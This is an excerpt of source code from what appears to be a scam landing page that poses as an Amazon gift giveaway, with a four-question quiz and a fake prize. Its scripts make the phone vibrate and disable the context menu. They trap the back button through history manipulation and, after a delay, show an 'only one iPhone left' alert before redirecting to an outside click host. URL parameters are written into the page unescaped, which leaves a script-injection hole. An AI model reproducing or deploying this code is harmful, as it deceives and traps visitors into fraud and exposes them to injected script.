...
<script>if (typeof window.orientation === 'undefined') document.location=location.href.split("?")[0]+"?"+location.href.split("?")[1].replace(/-/g,"")+'#';</script>
    ...
    <script type="text/javascript">function getURLParameter(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")};navigator.vibrate=navigator.vibrate||navigator.webkitVibrate||navigator.mozVibrate||navigator.msVibrate,navigator.vibrate([1e3,500,1e3,500,1e3,500,1e3,500,1e3]);document.oncontextmenu=function(){return false;};

    </script>

   <script>

  var b=getURLParameter('b'); var m=getURLParameter('m');
...
<body style="display: inline;">
  ...
  <script>!function(){"undefined"!=typeof window.orientation&&(document.body.style.display="inline")}();</script>
                ...
                <table class="wrapper">
                    ...
                    <tbody>
                        ...
                        <tr>
                            ...
                            <td align="left" valign="top"><b>Congratulations <script>document.write(getURLParameter('brand'))</script> User! Your <script>document.write(getURLParameter('model'))</script> has Won (1) Amazon Gift!</b>
 ...
 <div class="spacer"></div>
        ...
        <div class="form_questions wrapper">
            ...
            <div class="question wrapper" id="q1">
                ...
                <h3 style="" "color:#313c45;"=""><span style="font-weight:300;">Question 1 of 4:</span><br> Who founded Amazon?<br></h3>
            ...
            <div class="question wrapper" id="q2">
                ...
                <h3 style="color:#313c45;"><span style="font-weight:300; color:#313c45;">Question 2 of 4:</span> Where is the Headquarters of Amazon in USA?<br></h3>
                ...
                <span class="answer"><script>document.write(getURLParameter('city'))</script>, <script>document.write(getURLParameter('region'))</script></span>
  ...
  <div class="question wrapper" id="q4">
                ...
                <h3 style="" "color:#313c45;"=""><span style="font-weight:300; color:#313c45;">Question 4 of 4:</span> What does the logo of Amazon stand for?<br></h3>
 ...
 <table>
                    ...
                    <tbody>
                        ...
                        <tr>
                            ...
                            <td><img id="v2a" src="loading.gif"><img id="v2c" src="fb-check.jpg"></td>
 ...
 <div class="spacer" id="v4s"></div>
        ...
        <div class="prize wrapper" id="v4">
            ...
            <h5 style="color: #737373;text-align:center;padding-top:20px;">Thank you, loyal Amazon guest! You scored 100%!</h5>
...
<table width="100%" border="0">
        ...
        <tbody><tr class="pbox wrapper" style="opacity:0.5;">
 ...
 <td width="50%">
  ...
  setTimeout(function(){alert('NOTIFICATION - STOCK LOW!\n**********************\n\nONLY 1 iPhone 7 Red left in the Amazon Membership Rewards Giveaway! The last iPhone 7 Red worth $1,299 has been reserved to you by Amazon\n\n***THE RULES*** \n\n1. Press OK to claim your iPhone 7 Red. \n\n2. Follow the intructions on our secure offer page!');window.onbeforeunload=null;$(window).on('beforeunload', null);window.location = "http://111.okkeeii9.club/click";},3*60*1000);
    ...
    if(window.history&&window.history.pushState)window.onpopstate=function(){var n=location.hash,o=n.split("#!/"),i=o[1];if(""!==i){var a=window.location.hash;if(""===a)return window.onbeforeunload=null,window.location=lr,!1}},window.history.pushState("forward",null,"#valid");else{var ignoreHashChange=!0;window.onhashchange=function(){if(ignoreHashChange)ignoreHashChange=!1;else{ignoreHashChange=!0;var n=location.hash,o=n.split("#!/"),i=o[1];if(""!==i){var a=window.location.hash;if(""===a)return window.onbeforeunload=null,window.location=lr,!1}}},window.history.pushState("forward",null,"#valid")}
